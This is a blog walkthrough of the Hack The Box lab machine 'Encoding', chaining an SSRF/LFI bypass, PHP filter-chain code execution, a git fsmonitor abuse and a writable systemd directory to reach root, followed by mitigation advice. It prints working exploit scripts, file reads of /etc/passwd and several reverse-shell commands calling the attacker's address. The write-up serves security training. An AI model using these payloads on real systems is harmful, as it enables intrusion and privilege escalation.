---
layout: post
title: Hack The Box Walkthrough - Encoding
date: 2023-04-15
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/04/HTB/Encoding
img: 2023/04/Encoding/Encoding.png
---

This was a really fun box. I had to exploit two LFI vulnerabilities and PHP filters to get a foothold. Then exploit git configuration and systemd to escalate my privileges.

* Room: Encoding
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/Encoding](https://app.hackthebox.com/machines/Encoding)
* Author: [kavigihan](https://app.hackthebox.com/users/389926)

## Enumeration

I started by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.198:22
Open 10.10.11.198:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 08:26 EST

...

Scanned at 2023-03-04 08:26:12 EST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: HaxTables
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:26
Completed NSE at 08:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.92 seconds
```

Port 22 (SSH) and 80 (HTTP) were open. I also checked for UDP ports.

```bash
$ sudo nmap -sU target -oN nmapUdp.txt
[sudo] password for ehogue:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 08:26 EST
Nmap scan report for target (10.10.11.198)
Host is up (0.049s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1019.01 seconds
```

Only DHCP was open.

I did not see any redirects, but when I looked at the site, I saw that there was an API at 'api.haxtables.htb'. I added 'haxtables.htb' and 'api.haxtables.htb' to my hosts file and scanned for other subdomains.


```bash
$ wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -t30 --hw 137 -H "Host:FUZZ.haxtables.htb" "http://haxtables.htb"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://haxtables.htb/
Total requests: 5000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000051:   200        0 L      0 W        0 Ch        "api"
000000177:   403        9 L      28 W       284 Ch      "image"
000002700:   400        10 L     35 W       305 Ch      "m."
000002795:   400        10 L     35 W       305 Ch      "ns2.cl.bellsouth.net."
000002883:   400        10 L     35 W       305 Ch      "ns1.viviotech.net."
000002885:   400        10 L     35 W       305 Ch      "ns2.viviotech.net."
000003050:   400        10 L     35 W       305 Ch      "ns3.cl.bellsouth.net."
000004083:   400        10 L     35 W       305 Ch      "quatro.oweb.com."
000004082:   400        10 L     35 W       305 Ch      "jordan.fortwayne.com."
000004081:   400        10 L     35 W       305 Ch      "ferrari.fortwayne.com."

Total time: 0
Processed Requests: 4973
Filtered Requests: 4963
Requests/sec.: 0
```

It found 'image.haxtables.htb', I added it with the other domains.

## Main Website

I loaded the main website in a browser.

![Main Site](/assets/images/2023/04/Encoding/WebSite.png "Main Site")

The site allowed performing some transformations on strings and integers. There was also a section for images, but it was 'Coming soon'.

The Encoding menu took us to the pages to modify strings or integers. The URLs of those pages were interesting: 'http://haxtables.htb/index.php?page=string'. They had a 'page' parameter that looked like it could be vulnerable to Local File Inclusion (LFI). I tried a few things, but nothing worked. The code was validating the value passed in.

## API 

The API menu took me to the API documentation with some examples on how to use it. And a hint about the API supporting more features not exposed in the UI.

![API](/assets/images/2023/04/Encoding/API.png "API")


> You can use our live API to make these convertions easier. There are some additional features which the API supports that our application doesn't. This application itself uses the API internally as the backbone.

I scanned the API for hidden endpoints.

```bash
$ feroxbuster -u http://api.haxtables.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o feroxApi.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.haxtables.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ feroxApi.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        0l        0w        0c http://api.haxtables.htb/
403      GET        9l       28w      282c http://api.haxtables.htb/.php
403      GET        9l       28w      282c http://api.haxtables.htb/.html
403      GET        9l       28w      282c http://api.haxtables.htb/.htm
403      GET        9l       28w      282c http://api.haxtables.htb/.html.php
200      GET        0l        0w        0c http://api.haxtables.htb/index.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htm.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htaccess
403      GET        9l       28w      282c http://api.haxtables.htb/.htaccess.php
200      GET        0l        0w        0c http://api.haxtables.htb/utils.php
301      GET        9l       28w      319c http://api.haxtables.htb/v2 => http://api.haxtables.htb/v2/
403      GET        9l       28w      282c http://api.haxtables.htb/.phtml
301      GET        9l       28w      319c http://api.haxtables.htb/v1 => http://api.haxtables.htb/v1/
301      GET        9l       28w      319c http://api.haxtables.htb/v3 => http://api.haxtables.htb/v3/
403      GET        9l       28w      282c http://api.haxtables.htb/.htc

...

403      GET        9l       28w      282c http://api.haxtables.htb/.html_files.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htmlpar.php
403      GET        9l       28w      282c http://api.haxtables.htb/.htmlprint.php
403      GET        9l       28w      282c http://api.haxtables.htb/.hts.php
[####################] - 1m    504704/504704  0s      found:91      errors:0
[####################] - 1m    126176/126176  1473/s  http://api.haxtables.htb/
[####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v2/ => Directory listing (add -e to scan)
[####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v1/ => Directory listing (add -e to scan)
[####################] - 0s    126176/126176  0/s     http://api.haxtables.htb/v3/ => Directory listing (add -e to scan)
```

There were 3 versions of the API, and they had directory listing available. V1 and V3 of the API had two endpoints.

![Directory Listing](/assets/images/2023/04/Encoding/DirectoryListing.png "Directory Listing")

V2 was blocked, apparently it had security issues.

```json
{
  "message": "This resource is under construction and unavailable for public access due to security issues.!"
}
```

I could not load it directly, but I quickly found out that I could get to it by modifying the POST request that the UI sent when I used the encoding functions. The UI was using v3, I just changed it to v2.

```http
POST /handler.php HTTP/1.1
Host: haxtables.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=UTF-8
Origin: http://haxtables.htb
Connection: keep-alive
Referer: http://haxtables.htb/index.php?page=string
Content-Length: 69

{"action":"hex2str","data":"aaaaaaaaa","uri_path":"/v2/tools/string"}
```

```http
HTTP/1.1 200 OK
Date: Sat, 04 Mar 2023 14:00:55 GMT
Server: Apache/2.4.52 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 14

{"data":false}
```

I spent a lot of time trying to find the security issues in v2, but I did not find anything.

### LFI

The documentation showed that the API had a 'file_url' parameter that allowed loading the data to convert from a URL instead of passing it directly. I tried to point the 'file_url' to my machine, the server loaded the data from my machine. I tried redirecting it to another URL, but it did not appear to follow redirects.

I also tried to get it to load version 2 of the API from version 3.

```python
json_data = {
  'action': 'b64encode',
  'file_url' : 'http://api.haxtables.htb/v2/tools/string/index.php'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
```

The URL was blocked. 

```bash
$ python test.py
{"message":"Unacceptable URL"}
```

Next, I tried to get it to load a file from the server.

```python
import requests

json_data = {
  'action': 'b64encode',
  'file_url' : 'file:///etc/passwd'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
```

This worked. 

```bash
$ python test.py | jq ".data" | tr -d '"' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

I modified the code to take the file to download as a parameter and used it to download all the source code I could find on the server.

The code that was vulnerable was using curl to download the file.

```php
function get_url_content($url){
  $domain = parse_url($url, PHP_URL_HOST);
  if (gethostbyname($domain) === "127.0.0.1") {
    jsonify(["message" => "Unacceptable URL"]);
  }

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
  curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 0);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
  $url_content =  curl_exec($ch);
  curl_close($ch);
  return $url_content;
}
```

I could not use it to get code execution. It was also validating the domain to try to prevent Server Side Request Forgery (SSRF).

I also wrote a small script to look for other endpoints in v2.

```python
import requests
import json

file = open('/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt', 'r')
for line in file:
    file_to_get = line.strip()

    json_data = {
        'action': 'b64encode',
        'file_url' : f"file:///var/www/api/v2/tools/{file_to_get}/index.php"
    }

    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)

    json_data = json.loads(response.text)

    if (len(json_data['data']) > 0):
        print(file_to_get)
```

It did not find anything new.

## More LFI

I tried looking at the site on 'image.haxtables.htb', but I was blocked. Looking at the Apache config I got through the LFI, I saw that only localhost was allowed to access it.

```bash
<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
        
	DocumentRoot /var/www/image

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
	#SecRuleEngine On

...

        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>

</VirtualHost>
```

I used the LFI in the API to extract the code source for the image site. The code made it look like it was a git repository, so I extracted the .git folder also. 

I looked at the code, and I found another LFI vulnerability.

```php
<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>
```

This one used `include` to get the page without any validation. It would allow me to get code execution, but I was unable to access it.

I went back to the code that loaded a URL in the API.

```php
function get_url_content($url){
  $domain = parse_url($url, PHP_URL_HOST);
  if (gethostbyname($domain) === "127.0.0.1") {
    jsonify(["message" => "Unacceptable URL"]);
  }

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);

  ...
}
```

The code was using [parse_url](https://www.php.net/parse_url) to split the URL into parts, then [gethostbyname](https://www.php.net/gethostbyname) to make sure the domain did not point to localhost, and finally curl to make the request. 

I needed to find something that would not resolve to localhost in PHP, but still work in curl. I searched for vulnerabilities in all those functions. I tried multiple things like adding null bytes, and carriage returns, ... 

The name of the box and its image pointed to UTF-8, so I also tried adding UTF characters at the beginning and the end, but it broke curl. I found the [slide to a Black Hat presentation](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) that had many things to try. And I finally got it. I needed to send a request to 'image.haxtabⓛⓔs.htb'. It did not resolve to localhost in PHP, but it worked in curl, and Apache sent the request to the correct vhost.

I modified the LFI script to exploit the second LFI.

```python
#!/usr/bin/env python

import requests
import sys
import json
import base64

json_data = {
    'action': 'b64encode',
    'file_url' : "http://image.haxtabⓛⓔs.htb/actions/action_handler.php?page=/etc/passwd"
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)

json_data = json.loads(response.text)

if 'data' not in json_data:
    print('Failed')
    print(json_data)
    exit()

decoded = base64.b64decode(json_data['data']).decode()
print(decoded)
```


```bash
$ ./imageLFI.py
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

...
```

It worked. I then tried to get a file from my machine. 

```python
'file_url' : "http://image.haxtabⓛⓔs.htb/actions/action_handler.php?page=http://10.10.14.8/rce.php"
```

This failed. [allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include) must have been disabled.

I spent a lot of time trying to find PHP file to include that would allow me to run arbitrary code. Or find a way to write a file on the server. I did not find any.

Then I remembered the [PHP Filter Chain technique](https://github.com/synacktiv/php_filter_chain_generator). I cloned the generator repository to my machine and tried a simple command.

```bash
$ python3 php_filter_chain_generator.py --chain '<?php echo `id`; ?>'
[+] The following gadget chain will generate the following code : <?php echo `id`; ?> (base64 value: PD9waHAgZWNobyBgaWRgOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7 ... =php://temp
```

I used this filter chain as the page payload. 

```bash
$ ../imageLFI.py                                                     
b'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\x01\xb2B\x940\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0fC\xe0\x03\xd0\x03\xd0\xf8\x00\xf4\x00\xf4>\x00=\x00=\x0f\x80\x0f@\x0f'
```

The result of the command was returned with some junk. 

Next, I wrote a small script to open a reverse shell and used the filter to download it on the server.

```bash
$ cat shell.php       
<?php
`bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'`;

$ python php_filter_chain_generator.py  --chain '<?php `curl 10.10.14.8/shell.php -o /tmp/shell.php`; ?>'
[+] The following gadget chain will generate the following code : <?php `curl 10.10.14.8/shell.php -o /tmp/shell.php`; ?> (base64 value: PD9waHAgYGN1cmwgMTAuMTAuMTQuOC9zaGVsbC5waHAgLW8gL3RtcC9zaGVsbC5waHBgOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7| ...

$ python -m http.server 80                                                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Last, I used the second LFI to include the PHP file.
```python
'file_url' : "http://image.haxtabⓛⓔs.htb/actions/action_handler.php?page=/tmp/shell.php"
```

I got a hit on my netcat listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.198] 46612
bash: cannot set terminal process group (833): Inappropriate ioctl for device
bash: no job control in this shell
www-data@encoding:~/image/actions$ ls -la
ls -la
total 12
drwxr-xr-x 2 svc svc 4096 Mar  5 18:21 .
drwxr-xr-x 7 svc svc 4096 Mar  5 18:21 ..
-rw-r--r-- 1 svc svc  191 Mar  5 18:21 action_handler.php
-rw-r--r-- 1 svc svc    0 Mar  5 18:21 image2pdf.php
www-data@encoding:~/image/actions$ whoami
whoami
www-data
```

## Git Exploit

Once connected to the server I checked if I could run anything with sudo.

```bash
www-data@encoding:~/image/actions$ sudo -l
sudo -l
Matching Defaults entries for www-data on encoding:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on encoding:
    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
```

I was able to run a script to commit changes in the image repository as the svc user.

```bash
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
fi
```

The script checks if there are any new files in the repository. If there are any, they are added to the index. If there are none, the code commits any changes, without running pre-commit hooks.

I also saw a .gitconfig file in '/var/www/'.

```bash
www-data@encoding:~/image$ cat /var/www/.gitconfig
[safe]
        directory = /var/www/image
```

The [safe directory](https://git-scm.com/docs/git-config#Documentation/git-config.txt-safedirectory) configuration allows using git configuration and hooks in the repository, even if they are not owned by the user running the command. That meant I could create a configuration that would be used when I ran the command as svc.


I looked at the permissions on the git configuration. Only svc was able to write to the file

```bash
svc@encoding:/var/www/image$ ls -la /var/www/image/
total 36
drwxr-xr-x  7 svc  svc  4096 Mar  7 01:54 .
drwxr-xr-x  5 root root 4096 Mar  7 01:54 ..
drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 actions
drwxr-xr-x  3 svc  svc  4096 Mar  7 01:54 assets
drwxrwxr-x+ 8 svc  svc  4096 Mar  7 01:54 .git
drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 includes
-rw-r--r--  1 svc  svc    81 Mar  7 01:54 index.php
drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 scripts
-rw-r--r--  1 svc  svc  1250 Mar  7 01:54 utils.php

svc@encoding:/var/www/image$ ls -la /var/www/image/.git/
total 52
drwxrwxr-x+  8 svc svc 4096 Mar  7 01:54 .
drwxr-xr-x   7 svc svc 4096 Mar  7 01:54 ..
drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 branches
-rw-rwxr--+  1 svc svc   17 Mar  7 01:54 COMMIT_EDITMSG
-rw-r--r--+  1 svc svc   92 Mar  7 01:54 config
-rw-rwxr--+  1 svc svc   73 Mar  7 01:54 description
-rw-rwxr--+  1 svc svc   23 Mar  7 01:54 HEAD
drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 hooks
-rw-rwxr--+  1 svc svc  821 Mar  7 01:54 index
drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 info
drwxrwxr-x+  3 svc svc 4096 Mar  7 01:54 logs
drwxrwxr-x+ 22 svc svc 4096 Mar  7 01:54 objects
drwxrwxr-x+  4 svc svc 4096 Mar  7 01:54 refs
```

But there was a [+ sign](https://serverfault.com/questions/227852/what-does-a-mean-at-the-end-of-the-permissions-from-ls-l) at the end of the file permissions. I had never seen that before. It meant there were [additional permissions](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-acls) on the files.

```bash
svc@encoding:/var/www/image$ getfacl .git
# file: .git
# owner: svc
# group: svc
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x

svc@encoding:/var/www/image$ getfacl .git/config
# file: .git/config
# owner: svc
# group: svc
user::rw-
user:www-data:r--
group::r--
mask::r--
other::r--
```

With those permissions, www-data could write in .git. So I could overwrite the config file.

I added a command to run as the [file system monitor](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md#poc---executing-arbitrary-commands-via-corefsmonitor) in the existing '.git/config' file and ran the script.

```bash
www-data@encoding:/tmp$ cat /var/www/image/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
        fsmonitor = "bash -c 'bash -i >& /dev/tcp/10.10.14.8/4445 0>&1'"

www-data@encoding:/tmp$ sudo -u svc /var/www/image/scripts/git-commit.sh
```

I got a reverse shell as svc.

```bash
$ nc -klvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.198] 57242
svc@encoding:/var/www/image$

svc@encoding:/var/www/image$ cd
cd

svc@encoding:~$ ls -la
ls -la
total 40
drwxr-x--- 5 svc  svc  4096 Jan 23 18:23 .
drwxr-xr-x 3 root root 4096 Jan 13 16:25 ..
lrwxrwxrwx 1 svc  svc     9 Nov 11 14:31 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 3 svc  svc  4096 Jan 13 16:25 .cache
-rw-rw-r-- 1 svc  svc    85 Nov  8 16:37 .gitconfig
drwx------ 3 svc  svc  4096 Jan 13 16:25 .gnupg
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
drwx------ 2 svc  svc  4096 Jan 13 16:25 .ssh
-rw-r----- 1 root svc    33 Mar  5 12:05 user.txt

svc@encoding:~$ cat user.txt
cat user.txt
REDACTED
```

## Systemd Exploit

The svc user had a private ssh key in their home folder. I downloaded it to my machine and used it to reconnect. Then I looked for anything I could run with sudo.

```bash
svc@encoding:~$ sudo -l
Matching Defaults entries for svc on encoding:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on encoding:
    (root) NOPASSWD: /usr/bin/systemctl restart *
```

I could restart a service with `systemctl`. I found [a technique](https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/) that created a new service by adding a file in '/etc/systemd/system/'. 

Just as with the git repository, the normal file permissions did not allow me to write to the folder. But the ACL did.

```bash
svc@encoding:/var/www/image$ ls -ld /etc/systemd/system/
drwxrwxr-x+ 22 root root 4096 Mar 10 00:36 /etc/systemd/system/

svc@encoding:/var/www/image$ getfacl /etc/systemd/system/
getfacl: Removing leading '/' from absolute path names
# file: etc/systemd/system/
# owner: root
# group: root
user::rwx
user:svc:-wx
group::rwx
mask::rwx
other::r-x
```

I created a new service to open a reverse shell to my machine.

```bash
svc@encoding:~$ cat root.service
[Unit]
Description=pwn

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1'

svc@encoding:~$ cp root.service /etc/systemd/system/

sudo systemctl restart root.service
```

When the service restarted, I got the shell in my listener.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.198] 42394
bash: cannot set terminal process group (5229): Inappropriate ioctl for device
bash: no job control in this shell

root@encoding:/# cat /root/root.txt
cat /root/root.txt
REDACTED
```

## Mitigation

There were 2 LFI vulnerabilities in this box. The first one had some validations, but it should have made sure that the scheme was http or https. The URL should also be validated with `filter_var`. This would have rejected the URL with the UTF-8.

```php
<?php
$url = 'http://haxtabⓛⓔs.htb/test';
echo 'Original: ' . $url . "\n";
echo 'Filtered: ' . filter_var($url, FILTER_VALIDATE_URL) . "\n";
```

```bash
$ php test.php
Original: http://haxtabⓛⓔs.htb/test
Filtered: 
```

The second LFI was caused by an include of the `page` passed by the user. This is looking for trouble. There should have been some validation around the page passed in. If the goal was to show a page of the application, the code should have kept an allowed list of pages and made sure the page was valid. 

Another issue was with the permissions in the git repository. The safe directory setting allowed running code as another user. Without it, my fsmonitor configuration would have been ignored. And the ACL allowed me to write to a file that should have been protected.

The last issue with the permissions to restart any service in systemd. That should have allowed me to only restart the existing services. But since I was able to write in '/etc/systemd/system/', I was able to create a new service to restart and execute my code.